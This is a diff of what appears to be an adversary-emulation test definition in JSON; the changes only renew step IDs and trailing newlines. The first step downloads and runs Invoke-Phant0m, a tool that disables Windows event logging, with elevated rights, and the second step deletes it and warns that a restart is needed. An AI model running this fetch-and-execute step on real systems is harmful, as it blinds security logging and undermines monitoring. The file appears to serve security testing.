@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "0ffba201-5944-4f07-bf57-7c59300e1a34",
+      "id": "c37f9764-d7a1-44e7-b110-2d9c57ce94a4",
       "type": "execute-command",
       "data": {
-        "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n",
+        "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m",
         "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "abf8663d-67cb-416d-81e7-6a1e222e9670",
+      "id": "3ef3f9e0-33d7-4cee-883d-13740449d543",
       "type": "execute-command",
       "data": {
-        "command": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red\nRemove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore\n",
+        "command": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red\nRemove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore",
         "command_type": "powershell"
       },
       "elevation_required": true
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "0ffba201-5944-4f07-bf57-7c59300e1a34",
+      "s": "c37f9764-d7a1-44e7-b110-2d9c57ce94a4",
       "p": "on-success",
-      "o": "abf8663d-67cb-416d-81e7-6a1e222e9670"
+      "o": "3ef3f9e0-33d7-4cee-883d-13740449d543"
     },
     {
-      "s": "0ffba201-5944-4f07-bf57-7c59300e1a34",
+      "s": "c37f9764-d7a1-44e7-b110-2d9c57ce94a4",
       "p": "on-failure",
-      "o": "abf8663d-67cb-416d-81e7-6a1e222e9670"
+      "o": "3ef3f9e0-33d7-4cee-883d-13740449d543"
     }
   ],
   "tags": [
